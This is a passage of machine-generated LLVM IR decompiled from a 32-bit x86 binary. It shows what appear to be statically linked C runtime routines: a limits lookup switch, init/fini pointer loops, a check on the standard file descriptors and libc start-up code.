    i32 126, label %dec_label_pc_80517d8
    i32 127, label %dec_label_pc_80518d7
    i32 128, label %dec_label_pc_80518d7
    i32 129, label %dec_label_pc_80517d8
    i32 130, label %dec_label_pc_80517d8
    i32 131, label %dec_label_pc_80518d7
    i32 149, label %dec_label_pc_805188b
  ]

dec_label_pc_80517d8:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80517e2:                             ; preds = %dec_label_pc_80517c3
  %v1_80517e2 = call i32 @function_804ffeb(i32 ptrtoint (i32* @0 to i32))
  %v1_80517e7 = inttoptr i32 %v1_80517e2 to i32*
  store i32 22, i32* %v1_80517e7, align 4
  br label %dec_label_pc_80518d7

dec_label_pc_80517f2:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80517fc:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051806:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051810:                             ; preds = %dec_label_pc_80517c3
  %v0_8051813 = call i32 @function_8051f0d()
  br label %dec_label_pc_8051818

dec_label_pc_8051818:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_8051810
  br label %dec_label_pc_8051904

dec_label_pc_8051822:                             ; preds = %dec_label_pc_80517c3
  %v0_8051825 = call i32 @function_8051fa4()
  br label %dec_label_pc_805182a

dec_label_pc_805182a:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_8051822
  br label %dec_label_pc_8051904

dec_label_pc_8051834:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_805183e:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051848:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051852:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_805185c:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051866:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051870:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_805187a:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051884:                             ; preds = %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_805188b:                             ; preds = %dec_label_pc_80517c3
  %v5_8051891 = call i32 @function_8051d10(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8051899 = icmp slt i32 %v5_8051891, 0
  %v1_805189b = icmp eq i1 %v2_8051899, false
  br i1 %v1_805189b, label %dec_label_pc_80518ad, label %dec_label_pc_80518d7

dec_label_pc_805189f:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518a6:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518ad:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_805188b
  br label %dec_label_pc_8051904

dec_label_pc_80518b4:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518bb:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518c2:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518c9:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518d0:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518d7:                             ; preds = %dec_label_pc_805188b, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517e2
  br label %dec_label_pc_8051904

dec_label_pc_80518dc:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518e3:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518ea:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518f1:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518f8:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_80518ff:                             ; preds = %dec_label_pc_80517c3, %dec_label_pc_80517c3, %dec_label_pc_80517c3
  br label %dec_label_pc_8051904

dec_label_pc_8051904:                             ; preds = %dec_label_pc_80518f8, %dec_label_pc_80518f1, %dec_label_pc_80518ea, %dec_label_pc_80518e3, %dec_label_pc_80518dc, %dec_label_pc_80518d0, %dec_label_pc_80518c9, %dec_label_pc_80518c2, %dec_label_pc_80518bb, %dec_label_pc_80518b4, %dec_label_pc_80518a6, %dec_label_pc_805189f, %dec_label_pc_80518ad, %dec_label_pc_8051884, %dec_label_pc_805187a, %dec_label_pc_8051870, %dec_label_pc_8051866, %dec_label_pc_805185c, %dec_label_pc_8051852, %dec_label_pc_8051848, %dec_label_pc_805183e, %dec_label_pc_8051834, %dec_label_pc_805182a, %dec_label_pc_8051818, %dec_label_pc_8051806, %dec_label_pc_80517fc, %dec_label_pc_80517f2, %dec_label_pc_80517d8, %dec_label_pc_80518d7, %dec_label_pc_80518ff
  %v0_8051907 = phi i32 [ 255, %dec_label_pc_80518f8 ], [ 2048, %dec_label_pc_80518f1 ], [ 99, %dec_label_pc_80518ea ], [ 20, %dec_label_pc_80518e3 ], [ -128, %dec_label_pc_80518dc ], [ 1024, %dec_label_pc_80518d0 ], [ 4, %dec_label_pc_80518c9 ], [ 32, %dec_label_pc_80518c2 ], [ 256, %dec_label_pc_80518bb ], [ 2147483647, %dec_label_pc_80518b4 ], [ 16, %dec_label_pc_80518a6 ], [ 127, %dec_label_pc_805189f ], [ 200112, %dec_label_pc_80518ad ], [ 9, %dec_label_pc_8051884 ], [ 65535, %dec_label_pc_805187a ], [ -32768, %dec_label_pc_8051870 ], [ -2147483648, %dec_label_pc_8051866 ], [ 8, %dec_label_pc_805185c ], [ 500, %dec_label_pc_8051852 ], [ 4096, %dec_label_pc_8051848 ], [ 16384, %dec_label_pc_805183e ], [ 1000, %dec_label_pc_8051834 ], [ 32768, %dec_label_pc_805182a ], [ 6, %dec_label_pc_8051818 ], [ 65536, %dec_label_pc_8051806 ], [ 100, %dec_label_pc_80517fc ], [ 131072, %dec_label_pc_80517f2 ], [ 1, %dec_label_pc_80517d8 ], [ -1, %dec_label_pc_80518d7 ], [ 32767, %dec_label_pc_80518ff ]
  ret i32 %v0_8051907

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 14, 12, 15, 17, 16, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 22, 23, 3, 4, 16, 17, 20, 21, 14, 15, 18, 19, 1, 2, 12, 13, 24, 25, 26, 27 }
  uselistorder i32 65535, { 2, 0, 1 }
  uselistorder i32 2048, { 2, 1, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 63, { 1, 0, 2 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 46, { 1, 0 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 27, { 2, 3, 4, 5, 6, 7, 1, 0 }
  uselistorder i32 25, { 0, 2, 1, 3, 4 }
  uselistorder i32 17, { 1, 0 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 11, 8, 9, 10, 6 }
  uselistorder i32 5, { 3, 0, 5, 6, 7, 8, 9, 10, 4, 2, 1 }
  uselistorder label %dec_label_pc_8051904, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80518d7, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80518ad, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805182a, { 1, 0 }
  uselistorder label %dec_label_pc_8051818, { 1, 0 }
}

define i32 @function_8051908() local_unnamed_addr {
dec_label_pc_8051908:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051908 = load i32, i32* @ebx, align 4
  store i32 %v0_8051908, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_805191c, label %dec_label_pc_8051929

dec_label_pc_805191c:                             ; preds = %dec_label_pc_8051908, %dec_label_pc_805191c
  %v1_80519236 = phi i32 [ %v1_8051923, %dec_label_pc_805191c ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 -1), %dec_label_pc_8051908 ]
  store i32 ptrtoint (i32* @global_var_8051923.58 to i32), i32* %stack_var_-16, align 4
  %v5_805191c = mul i32 %v1_80519236, 4
  %v6_805191c = add i32 %v5_805191c, ptrtoint (i32* @global_var_8053000.57 to i32)
  %v7_805191c = inttoptr i32 %v6_805191c to i32*
  %v8_805191c = load i32, i32* %v7_805191c, align 4
  call void @__pseudo_call(i32 %v8_805191c)
  %v0_8051923.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051923 = add i32 %v0_8051923.pre, -1
  store i32 %v1_8051923, i32* %ebx.global-to-local, align 4
  %v10_8051924 = icmp eq i32 %v0_8051923.pre, 0
  %v1_8051927 = icmp eq i1 %v10_8051924, false
  br i1 %v1_8051927, label %dec_label_pc_805191c, label %dec_label_pc_8051929

dec_label_pc_8051929:                             ; preds = %dec_label_pc_805191c, %dec_label_pc_8051908
  %v0_8051929 = load i32, i32* @global_var_8053148.59, align 8
  %v1_805192e = icmp eq i32 %v0_8051929, 0
  br i1 %v1_805192e, label %dec_label_pc_8051934, label %dec_label_pc_8051932

dec_label_pc_8051932:                             ; preds = %dec_label_pc_8051929
  %v0_8051932 = load i32, i32* %stack_var_-16, align 4
  %v1_8051932 = call i32 @unknown_0(i32 %v0_8051932)
  br label %dec_label_pc_8051934

dec_label_pc_8051934:                             ; preds = %dec_label_pc_8051932, %dec_label_pc_8051929
  %v0_8051934 = load i32, i32* @global_var_805314c.60, align 4
  store i32 %v0_8051934, i32* @ecx, align 4
  %v1_805193a = icmp eq i32 %v0_8051934, 0
  br i1 %v1_805193a, label %dec_label_pc_8051943, label %dec_label_pc_805193e

dec_label_pc_805193e:                             ; preds = %dec_label_pc_8051934
  %v2_8051940 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051940, i32* %ebx.global-to-local, align 4
  %v0_8051941 = load i32, i32* %stack_var_-16, align 4
  %v1_8051941 = call i32 @unknown_0(i32 %v0_8051941)
  br label %dec_label_pc_8051943

dec_label_pc_8051943:                             ; preds = %dec_label_pc_8051934, %dec_label_pc_805193e
  %v2_8051943 = load i32, i32* %stack_var_-16, align 4
  %v2_8051944 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051944, i32* @edx, align 4
  ret i32 %v2_8051943

; uselistorder directives
  uselistorder i32 %v1_8051923, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051943, { 1, 0 }
  uselistorder label %dec_label_pc_805191c, { 1, 0 }
}

define i32 @function_8051947(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051947:
  ret i32 0
}

define i32 @function_805194a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805194a:
  %v0_805194a = load i32, i32* @eax, align 4
  ret i32 %v0_805194a
}

define i32 @function_805194b() local_unnamed_addr {
dec_label_pc_805194b:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_805194b = load i32, i32* @esi, align 4
  %v0_805194c = load i32, i32* @ebx, align 4
  %v0_8051950 = load i32, i32* @eax, align 4
  store i32 %v0_8051950, i32* @esi, align 4
  %v0_8051952 = load i32, i32* @edx, align 4
  store i32 %v0_8051952, i32* @ebx, align 4
  %v4_8051957 = call i32 @function_804fa1d(i32 %v0_8051950, i32 1, i32 %tmp6)
  %v8_805195f = icmp eq i32 %v4_8051957, -1
  %v1_8051960 = icmp eq i1 %v8_805195f, false
  br i1 %v1_8051960, label %dec_label_pc_805197b, label %dec_label_pc_8051962

dec_label_pc_8051962:                             ; preds = %dec_label_pc_805194b
  %v0_8051964 = load i32, i32* @ebx, align 4
  %v6_805196a = call i32 @function_804fbc4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052780.61, i32 0, i32 0), i32 %v0_8051964)
  %v1_8051972 = load i32, i32* @esi, align 4
  %v12_8051972 = icmp eq i32 %v6_805196a, %v1_8051972
  br i1 %v12_8051972, label %dec_label_pc_805197b, label %dec_label_pc_8051976

dec_label_pc_8051976:                             ; preds = %dec_label_pc_8051962
  %v0_8051976 = call i32 @function_805137f()
  br label %dec_label_pc_805197b

dec_label_pc_805197b:                             ; preds = %dec_label_pc_8051962, %dec_label_pc_805194b, %dec_label_pc_8051976
  %v2_805197b = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805194c, i32* @ebx, align 4
  store i32 %v0_805194b, i32* @esi, align 4
  ret i32 %v2_805197b

; uselistorder directives
  uselistorder i32 ()* @function_805137f, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_804fbc4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804fa1d, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805197b, { 2, 0, 1 }
}

define i32 @function_805197f() local_unnamed_addr {
dec_label_pc_805197f:
  %v0_8051982 = load i8, i8* @global_var_8053150.62, align 16
  %v1_8051982 = icmp eq i8 %v0_8051982, 0
  %v1_8051989 = icmp eq i1 %v1_8051982, false
  br i1 %v1_8051989, label %dec_label_pc_805197f.dec_label_pc_80519bb_crit_edge, label %dec_label_pc_805198b

dec_label_pc_805197f.dec_label_pc_80519bb_crit_edge: ; preds = %dec_label_pc_805197f
  %v0_80519be.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80519bb

dec_label_pc_805198b:                             ; preds = %dec_label_pc_805197f
  store i8 1, i8* @global_var_8053150.62, align 16
  store i32 4096, i32* @global_var_8053144.63, align 4
  br label %dec_label_pc_80519bb

dec_label_pc_80519bb:                             ; preds = %dec_label_pc_805197f.dec_label_pc_80519bb_crit_edge, %dec_label_pc_805198b
  %v0_80519be = phi i32 [ %v0_80519be.pre, %dec_label_pc_805197f.dec_label_pc_80519bb_crit_edge ], [ 0, %dec_label_pc_805198b ]
  ret i32 %v0_80519be

; uselistorder directives
  uselistorder i8 1, { 8, 1, 7, 0, 4, 5, 2, 3, 6 }
  uselistorder i8* @global_var_8053150.62, { 1, 0 }
  uselistorder label %dec_label_pc_80519bb, { 1, 0 }
}

define i32 @function_80519bf(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80519bf:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_80519bf = load i32, i32* @ebp, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805313c.64, align 4
  store i32 %arg6, i32* @global_var_805314c.60, align 4
  %v2_80519f6 = mul i32 %arg2, 4
  %v3_80519f6 = add i32 %tmp44, %v2_80519f6
  %v1_80519f9 = add i32 %v3_80519f6, 4
  store i32 %v1_80519f9, i32* @global_var_8053140.65, align 64
  %v3_8051a01 = load i32, i32* %arg3, align 4
  %v14_8051a01 = icmp eq i32 %v1_80519f9, %v3_8051a01
  %v1_8051a03 = icmp eq i1 %v14_8051a01, false
  %v1_80519f9.v3_80519f6 = select i1 %v1_8051a03, i32 %v1_80519f9, i32 %v3_80519f6
  store i32 %v1_80519f9.v3_80519f6, i32* @global_var_8053140.65, align 64
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8051a10 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051a15 = bitcast i32* %stack_var_-136 to i8*
  %v4_8051a15 = call i32 @function_805003c(i8* %v3_8051a15, i32 0, i32 120)
  %v0_8051a1a = load i32, i32* @global_var_8053140.65, align 64
  br label %dec_label_pc_8051a22

dec_label_pc_8051a22:                             ; preds = %dec_label_pc_8051a22, %dec_label_pc_80519bf
  %v0_8051a22 = phi i32 [ %v1_8051a25, %dec_label_pc_8051a22 ], [ %v0_8051a1a, %dec_label_pc_80519bf ]
  %v1_8051a22 = inttoptr i32 %v0_8051a22 to i32*
  %v2_8051a22 = load i32, i32* %v1_8051a22, align 4
  %v3_8051a22 = icmp eq i32 %v2_8051a22, 0
  %v1_8051a25 = add i32 %v0_8051a22, 4
  %v1_8051a28 = icmp eq i1 %v3_8051a22, false
  br i1 %v1_8051a28, label %dec_label_pc_8051a22, label %dec_label_pc_8051a49.preheader

dec_label_pc_8051a49.preheader:                   ; preds = %dec_label_pc_8051a22
  store i32 %v1_8051a25, i32* @ebx, align 4
  %v1_8051a4922 = inttoptr i32 %v1_8051a25 to i32*
  %v2_8051a4923 = load i32, i32* %v1_8051a4922, align 4
  %v3_8051a4924 = icmp eq i32 %v2_8051a4923, 0
  %v1_8051a4c26 = icmp eq i1 %v3_8051a4924, false
  br i1 %v1_8051a4c26, label %dec_label_pc_8051a2e.lr.ph, label %dec_label_pc_8051a4e

dec_label_pc_8051a2e.lr.ph:                       ; preds = %dec_label_pc_8051a49.preheader
  %v3_8051a0e = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051a39 = add i32 %v3_8051a0e, 32
  br label %dec_label_pc_8051a2e

dec_label_pc_8051a2e:                             ; preds = %dec_label_pc_8051a2e.lr.ph, %dec_label_pc_8051a46
  %v1_8051a39 = phi i32 [ %v2_8051a4923, %dec_label_pc_8051a2e.lr.ph ], [ %v2_8051a49, %dec_label_pc_8051a46 ]
  %v0_8051a38 = phi i32 [ %v1_8051a25, %dec_label_pc_8051a2e.lr.ph ], [ %v1_8051a46, %dec_label_pc_8051a46 ]
  %v6_8051a33 = icmp ugt i32 %v1_8051a39, 14
  br i1 %v6_8051a33, label %dec_label_pc_8051a46, label %dec_label_pc_8051a35

dec_label_pc_8051a35:                             ; preds = %dec_label_pc_8051a2e
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_8051a38, i32* %stack_var_-168, align 4
  %v2_8051a39 = mul i32 %v1_8051a39, 8
  %v4_8051a39 = add i32 %v3_8051a39, %v2_8051a39
  %v3_8051a3e = inttoptr i32 %v4_8051a39 to i16*
  %v4_8051a3e = call i32 @function_805220a(i16* %v3_8051a3e, i32 %v0_8051a38, i32 8)
  %v0_8051a46.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051a46

dec_label_pc_8051a46:                             ; preds = %dec_label_pc_8051a2e, %dec_label_pc_8051a35
  %v0_8051a46 = phi i32 [ %v0_8051a38, %dec_label_pc_8051a2e ], [ %v0_8051a46.pre, %dec_label_pc_8051a35 ]
  %v1_8051a46 = add i32 %v0_8051a46, 8
  store i32 %v1_8051a46, i32* @ebx, align 4
  %v1_8051a49 = inttoptr i32 %v1_8051a46 to i32*
  %v2_8051a49 = load i32, i32* %v1_8051a49, align 4
  %v3_8051a49 = icmp eq i32 %v2_8051a49, 0
  %v1_8051a4c = icmp eq i1 %v3_8051a49, false
  br i1 %v1_8051a4c, label %dec_label_pc_8051a2e, label %dec_label_pc_8051a4e

dec_label_pc_8051a4e:                             ; preds = %dec_label_pc_8051a46, %dec_label_pc_8051a49.preheader
  store i32 %v2_8051a10, i32* @eax, align 4
  %v0_8051a52 = call i32 @function_80522dd()
  store i32 %v0_8051a52, i32* @eax, align 4
  %v0_8051a57 = call i32 @function_805197f()
  %v1_8051a60 = icmp eq i32 %tmp39, 0
  %v1_8051a62 = icmp eq i1 %v1_8051a60, false
  %v1_8051a64 = and i32 %tmp39, -65536
  %v2_8051a64 = or i32 %v1_8051a64, 4096
  %storemerge = select i1 %v1_8051a62, i32 %tmp39, i32 %v2_8051a64
  store i32 %storemerge, i32* @global_var_8053144.63, align 4
  %v13_8051a6d = icmp eq i32 %tmp38, -1
  %v1_8051a72 = icmp eq i1 %v13_8051a6d, false
  br i1 %v1_8051a72, label %dec_label_pc_8051a9d, label %dec_label_pc_8051a74

dec_label_pc_8051a74:                             ; preds = %dec_label_pc_8051a4e
  %v0_8051a74 = call i32 @function_8051fe9()
  store i32 %v0_8051a74, i32* @ebx, align 4
  %v0_8051a7b = call i32 @function_8051f58()
  %v0_8051a80 = load i32, i32* @ebx, align 4
  %v12_8051a80 = icmp eq i32 %v0_8051a80, %v0_8051a7b
  %v1_8051a82 = icmp eq i1 %v12_8051a80, false
  br i1 %v1_8051a82, label %dec_label_pc_8051ab3, label %dec_label_pc_8051a84

dec_label_pc_8051a84:                             ; preds = %dec_label_pc_8051a74
  %v0_8051a84 = call i32 @function_8051f7e()
  store i32 %v0_8051a84, i32* @ebx, align 4
  %v0_8051a8b = call i32 @function_8051f32()
  %v0_8051a90 = load i32, i32* @ebx, align 4
  %v12_8051a90 = icmp eq i32 %v0_8051a90, %v0_8051a8b
  %v1_8051a92 = icmp eq i1 %v12_8051a90, false
  br i1 %v1_8051a92, label %dec_label_pc_8051ab3, label %dec_label_pc_8051add

dec_label_pc_8051a9d:                             ; preds = %dec_label_pc_8051a4e
  br label %dec_label_pc_8051ab3

dec_label_pc_8051ab3:                             ; preds = %dec_label_pc_8051a9d, %dec_label_pc_8051a84, %dec_label_pc_8051a74
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051aba = call i32 @function_805194b()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051ac9 = call i32 @function_805194b()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051ad8 = call i32 @function_805194b()
  br label %dec_label_pc_8051add

dec_label_pc_8051add:                             ; preds = %dec_label_pc_8051a84, %dec_label_pc_8051ab3
  store i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32* %esi.global-to-local, align 4
  %v0_8051ae2 = load i32, i32* @edi, align 4
  %v1_8051ae2 = inttoptr i32 %v0_8051ae2 to i32*
  %v2_8051ae2 = load i32, i32* %v1_8051ae2, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32* %esi.global-to-local, align 4
  store i32 %v2_8051ae2, i32* inttoptr (i32 134557828 to i32*), align 4
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8053148.59, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557693), i32 7), label %dec_label_pc_8051b0e, label %dec_label_pc_8051b02

dec_label_pc_8051b02:                             ; preds = %dec_label_pc_8051add, %dec_label_pc_8051b02
  %v4_8051b02 = phi i32 [ %v1_8051b09, %dec_label_pc_8051b02 ], [ 0, %dec_label_pc_8051add ]
  %v5_8051b02 = mul i32 %v4_8051b02, 4
  %v6_8051b02 = add i32 %v5_8051b02, ptrtoint (i32* @global_var_8053000.57 to i32)
  %v7_8051b02 = inttoptr i32 %v6_8051b02 to i32*
  %v8_8051b02 = load i32, i32* %v7_8051b02, align 4
  call void @__pseudo_call(i32 %v8_8051b02)
  %v0_8051b09 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b09 = add i32 %v0_8051b09, 1
  store i32 %v1_8051b09, i32* %ebx.global-to-local, align 4
  %v1_8051b0a = load i32, i32* %esi.global-to-local, align 4
  %v7_8051b0a = icmp ult i32 %v1_8051b09, %v1_8051b0a
  br i1 %v7_8051b0a, label %dec_label_pc_8051b02, label %dec_label_pc_8051b0e

dec_label_pc_8051b0e:                             ; preds = %dec_label_pc_8051b02, %dec_label_pc_8051add
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_8051b26, label %dec_label_pc_8051b32

dec_label_pc_8051b26:                             ; preds = %dec_label_pc_8051b0e, %dec_label_pc_8051b26
  %v4_8051b26 = phi i32 [ %v1_8051b2d, %dec_label_pc_8051b26 ], [ 0, %dec_label_pc_8051b0e ]
  store i32 ptrtoint (i32* @global_var_8051b2d.69 to i32), i32* %stack_var_-164, align 4
  %v5_8051b26 = mul i32 %v4_8051b26, 4
  %v6_8051b26 = add i32 %v5_8051b26, ptrtoint (i32* @global_var_8053000.57 to i32)
  %v7_8051b26 = inttoptr i32 %v6_8051b26 to i32*
  %v8_8051b26 = load i32, i32* %v7_8051b26, align 4
  call void @__pseudo_call(i32 %v8_8051b26)
  %v0_8051b2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b2d = add i32 %v0_8051b2d, 1
  store i32 %v1_8051b2d, i32* %ebx.global-to-local, align 4
  %v1_8051b2e = load i32, i32* %esi.global-to-local, align 4
